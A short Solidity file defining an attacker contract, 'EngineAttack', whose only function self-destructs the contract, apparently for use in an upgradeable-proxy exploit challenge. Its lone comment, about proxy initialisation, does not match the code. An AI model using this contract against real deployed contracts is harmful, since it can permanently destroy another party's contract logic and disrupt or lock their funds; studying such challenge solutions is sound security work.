// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


contract EngineAttack {
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.

    function destruct(address payable to) external {
        selfdestruct(to);
    }
}